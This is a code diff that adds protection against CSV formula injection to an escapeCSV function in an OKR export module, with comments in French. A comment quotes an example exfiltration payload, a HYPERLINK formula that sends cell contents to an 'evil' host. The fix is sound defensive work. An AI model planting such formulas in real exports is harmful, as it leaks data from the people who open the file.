@@ -15,10 +15,20 @@ import type { OKR } from '@/modules/okrs';
 /**
  * Échappe une valeur pour CSV : entoure de guillemets si contient virgule,
  * guillemet, ou retour à la ligne. Les guillemets internes sont doublés.
+ *
+ * Protège aussi contre la **CSV formula injection** (faille N11) : Excel /
+ * Google Sheets interprètent comme formule toute cellule dont le 1er caractère
+ * est `= + - @ \t \r`. Un nom de tâche `=HYPERLINK("http://evil/?leak="&A1)`
+ * exfiltrerait des données à l'ouverture du fichier. Le mitigateur standard
+ * (OWASP) est de préfixer une apostrophe (`'`) — invisible à l'affichage,
+ * neutralise l'interprétation formule.
  */
 function escapeCSV(value: unknown): string {
   if (value === null || value === undefined) return '';
-  const str = String(value);
+  let str = String(value);
+  if (str.length > 0 && /^[=+\-@\t\r]/.test(str)) {
+    str = `'${str}`;
+  }
   if (/[",\n\r]/.test(str)) {
     return `"${str.replace(/"/g, '""')}"`;
   }
